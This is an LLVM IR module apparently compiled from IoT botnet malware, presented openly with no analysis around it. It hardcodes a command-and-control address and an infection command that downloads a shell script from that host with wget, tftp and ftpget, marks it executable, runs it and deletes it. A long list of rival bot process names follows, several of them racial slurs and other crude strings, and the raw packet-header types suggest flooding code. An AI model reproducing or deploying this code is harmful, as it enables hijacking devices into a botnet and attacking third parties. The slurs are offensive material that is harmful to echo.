; ModuleID = 'host/ir_sub/Lulz.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.list = type { i8*, %struct.list*, %struct.list* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.dns_hdr = type { i16, i16, i16, i16, i16, i16 }
%struct.query = type { i16, i16 }
%struct.ps_hdr = type { i32, i32, i8, i8, i16 }
%struct.thread_data = type { i32, i8*, i32, i32, i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.7, %union.anon.8 }
%union.anon.7 = type { [16 x i8] }
%union.anon.8 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@cncServer = global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"199.38.245.222:23\00", align 1
@rekdevice = global i8* getelementptr inbounds ([477 x i8], [477 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [477 x i8] c"cd /tmp || cd /home/$USER || cd /var/run || cd /dev/shm || cd /mnt || cd /var || cd /; wget http://199.38.245.222/bins.sh; busybox wget http://199.38.245.222/bins.sh; tftp -r bins.sh -g 199.38.245.222; busybox tftp -r bins.sh -g 199.38.245.222; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh\0D\0A\00\00", align 1
@knownBots = global [193 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [7 x i8] c"902i13\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"BzSxLxBxeY\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"HOHO-LUGO7\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"HOHO-U79OL\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"JuYfouyf87\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"NiGGeR69xd\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"SO190Ij1X\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"LOLKIKEEEDDE\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"ekjheory98e\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"scansh4\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"MDMA\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"fdevalvex\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"scanspc\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"MELTEDNINJAREALZ\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"flexsonskids\00", align 1
@.str.17 = private unnamed_addr constant [8 x i8] c"scanx86\00", align 1
@.str.18 = private unnamed_addr constant [12 x i8] c"foAxi102kxe\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"swodjwodjwoj\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"MmKiy7f87l\00", align 1
@.str.21 = private unnamed_addr constant [14 x i8] c"freecookiex86\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c"sysgpu\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c"frgege\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"sysbinsr\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"0DnAzepd\00", align 1
@.str.26 = private unnamed_addr constant [14 x i8] c"NiGGeRD0nks69\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"frgreu\00", align 1
@.str.28 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.29 = private unnamed_addr constant [11 x i8] c"0x766f6964\00", align 1
@.str.30 = private unnamed_addr constant [16 x i8] c"NiGGeRd0nks1337\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"gaft\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"urasgbsigboa\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"120i3UI49\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"OaF3\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"geae\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"vaiolmao\00", align 1
@.str.37 = private unnamed_addr constant [8 x i8] c"123123a\00", align 1
@.str.38 = private unnamed_addr constant [15 x i8] c"Ofurain0n4H34D\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"ggTrex\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"wasads\00", align 1
@.str.41 = private unnamed_addr constant [12 x i8] c"1293194hjXD\00", align 1
@.str.42 = private unnamed_addr constant [10 x i8] c"OthLaLosn\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"ggt\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"wget-log\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"1337SoraLOADER\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"SAIAKINA\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"ggtq\00", align 1
@.str.48 = private unnamed_addr constant [17 x i8] c"1378bfp919GRB1Q2\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"SAIAKUSO\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ggtr\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"14Fa\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"SEXSLAVE1337\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"ggtt\00", align 1
@.str.54 = private unnamed_addr constant [15 x i8] c"1902a3u912u3u4\00", align 1
@.str.55 = private unnamed_addr constant [10 x i8] c"haetrghbr\00", align 1
@.str.56 = private unnamed_addr constant [7 x i8] c"19ju3d\00", align 1
@.str.57 = private unnamed_addr constant [12 x i8] c"SORAojkf120\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"hehahejeje92\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"2U2JDJA901F91\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"SlaVLav12\00", align 1
@.str.61 = private unnamed_addr constant [17 x i8] c"helpmedaddthhhhh\00", align 1
@.str.62 = private unnamed_addr constant [11 x i8] c"2wgg9qphbq\00", align 1
@.str.63 = private unnamed_addr constant [18 x i8] c"Slav3Th3seD3vices\00", align 1
@.str.64 = private unnamed_addr constant [11 x i8] c"hzSmYZjYMQ\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"5Gbf\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"SoRAxD123LOL\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"iaGv\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"5aA3\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"SoRAxD420LOL\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"insomni\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"640277\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"SoraBeReppin1337\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"ipcamCache\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"66tlGg9Q\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"T\00", align 1
@.str.76 = private unnamed_addr constant [11 x i8] c"jUYfouyf87\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"6ke3\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"TOKYO3\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"lyEeaXul2dULCVxh\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"93OfjHZ2z\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"TY2gD6MZvKc7KU6r\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"mMkiy6f87l\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"A023UU4U24UIU\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"TheWeeknd\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"mioribitches\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"A5p9\00", align 1
@.str.87 = private unnamed_addr constant [11 x i8] c"TheWeeknds\00", align 1
@.str.88 = private unnamed_addr constant [10 x i8] c"mnblkjpoi\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"AbAd\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"Tokyos\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"neb\00", align 1
@.str.92 = private unnamed_addr constant [6 x i8] c"Akiru\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"U8inTz\00", align 1
@.str.94 = private unnamed_addr constant [9 x i8] c"netstats\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"Alex\00", align 1
@.str.96 = private unnamed_addr constant [11 x i8] c"W9RCAKM20T\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"newnetword\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"Ayo215\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"Word\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"nloads\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"BAdAsV\00", align 1
@.str.102 = private unnamed_addr constant [9 x i8] c"Wordmane\00", align 1
@.str.103 = private unnamed_addr constant [11 x i8] c"notyakuzaa\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"Belch\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"Wordnets\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"obp\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"BigN0gg0r420\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"X0102I34f\00", align 1
@.str.109 = private unnamed_addr constant [14 x i8] c"ofhasfhiafhoi\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"X19I239124UIU\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"oism\00", align 1
@.str.112 = private unnamed_addr constant [9 x i8] c"Deported\00", align 1
@.str.113 = private unnamed_addr constant [14 x i8] c"XSHJEHHEIIHWO\00", align 1
@.str.114 = private unnamed_addr constant [10 x i8] c"olsVNwo12\00", align 1
@.str.115 = private unnamed_addr constant [17 x i8] c"DeportedDeported\00", align 1
@.str.116 = private unnamed_addr constant [11 x i8] c"XkTer0GbA1\00", align 1
@.str.117 = private unnamed_addr constant [9 x i8] c"onry0v03\00", align 1
@.str.118 = private unnamed_addr constant [17 x i8] c"FortniteDownLOLZ\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"Y0urM0mGay\00", align 1
@.str.120 = private unnamed_addr constant [16 x i8] c"pussyfartlmaojk\00", align 1
@.str.121 = private unnamed_addr constant [15 x i8] c"GrAcEnIgGeRaNn\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"YvdGkqndCO\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"qGeoRBe6BE\00", align 1
@.str.124 = private unnamed_addr constant [12 x i8] c"GuiltyCrown\00", align 1
